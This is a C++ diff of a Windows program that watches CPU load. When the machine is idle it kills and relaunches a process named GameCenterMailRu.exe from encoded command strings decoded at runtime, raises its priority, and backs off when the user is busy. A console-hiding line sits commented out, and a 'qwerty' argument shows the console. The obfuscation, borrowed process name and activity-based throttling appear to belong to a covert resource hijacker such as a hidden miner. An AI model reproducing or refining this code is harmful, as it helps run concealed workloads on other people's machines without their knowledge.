@@ -22,8 +22,8 @@ using namespace std;
 FILE* pipe = NULL;
 
 int CPU = 0;
-int IdleTime = 0;
-int BusyTime = 0;
+int IDLE = 0;
+int BUSY = 0;
 
 int thr;
 
@@ -32,7 +32,7 @@ bool cons = false;
 
 vector<hide::line> Run;
 
-#define TIMEOUT     10
+#define TIMEOUT     100
 #define DEADLINE    5 
 
 int THRMAX = 0;
@@ -43,71 +43,56 @@ int THRMAX = 0;
 void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 
 static string percent;
 static char buff[16];
-FILE* wmic = popen("wmic cpu get loadpercentage", "r"); 
+FILE* wmic = ::popen("wmic cpu get loadpercentage", "r"); 
 if(!wmic)
     throw runtime_error("wmic fail");
 
-while( fgets(buff, sizeof(buff), wmic)!=NULL) {
+while( ::fgets(buff, sizeof(buff), wmic)!=NULL) {
     percent = buff;
     if ( isdigit( *percent.begin()) ) break;
 }
 ::pclose(wmic);
 istringstream sper(percent);
 sper >> CPU;
+
 if (show_cpu) cout << CPU << endl;
-if ((100 - CPU) > 25) {
-   ++IdleTime;  
 
-cout << "IDLE: " << IdleTime << endl;
+if ( ((100 - CPU) > 24) && thr < THRMAX ) {
+   ++IDLE;  
 
-}
-else IdleTime = 0;
-
-if ((100 - CPU) < 10) {
-   ++BusyTime;  
-
-cout << "BUSY: " << BusyTime << endl;
+cout << "IDLE: " << IDLE << endl;
 
 }
-else BusyTime = 0;
+else IDLE = 0;
 
-if (IdleTime == TIMEOUT) {
-    IdleTime = 0;
+if ((100 - CPU) < 5 && thr > 1) {
+   ++BUSY;  
 
-cout << "IDLE STOP GameCenter" << endl;
-    pipe = ::popen("taskkill /IM GameCenterMailRu.exe /F 2>&1", "r");
-    while ( ::fgets ( buff, sizeof(buff), pipe )!=NULL ) 
-        ;
-    ::pclose(pipe);
-    pipe = 0;
+cout << "BUSY: " << BUSY << endl;
 
+}
+else BUSY = 0;
+
+if (IDLE == TIMEOUT) {
+    IDLE = 0;
     thr = (thr == THRMAX) ? thr : ++thr; 
 
-cout << Run[thr].c_str() << endl;
+cout << "IDLE STOP GameCenter" << endl;
+    ::system("taskkill /IM GameCenterMailRu.exe /F 2>&1");
+cout << "Run: " << thr << endl;
+    ::system( Run[thr].c_str()); 
+    ::system("wmic process where name=\"GameCenterMailRu.exe\" setpriority=128");
 
-    pipe = ::popen( Run[thr].c_str(), "r"); 
-    if(!pipe)
-        throw runtime_error(Run[thr] + ": popen fail");
 } else 
-    if (BusyTime == DEADLINE) {
-        BusyTime = 0;
+    if (BUSY == DEADLINE) {
+        BUSY = 0;
+        thr = (thr == 0) ? thr : --thr; 
 
 cout << "BUSY STOP GameCenter" << endl;
-    pipe = ::popen("taskkill /IM GameCenterMailRu.exe /F 2>&1", "r");
-    while ( ::fgets ( buff, sizeof(buff), pipe )!=NULL ) 
-        ;
-    ::pclose(pipe);
-    pipe = 0;
-
-    thr = (thr == 0) ? thr : --thr; 
-    if (thr) {
-
-cout << Run[thr].c_str() << endl;
-
-    pipe = ::popen( Run[thr].c_str(), "r"); 
-        if(!pipe)
-            throw runtime_error(Run[thr] + ": popen fail");
-   } else { cout << "Just wait" << endl; }
+        ::system("taskkill /IM GameCenterMailRu.exe /F 2>&1");
+cout << "Run: " << thr << endl;
+        ::system( Run[thr].c_str()); 
+        ::system("wmic process where name=\"GameCenterMailRu.exe\" setpriority=128");
    }
 
 }
@@ -137,7 +122,7 @@ if (argc > 1) {
     if (arg == "qwerty") cons = true;
 }
 
-//if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );
+//if (!cons) ::ShowWindow( ::GetConsoleWindow(), SW_HIDE );
 
 static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
     name.decode();
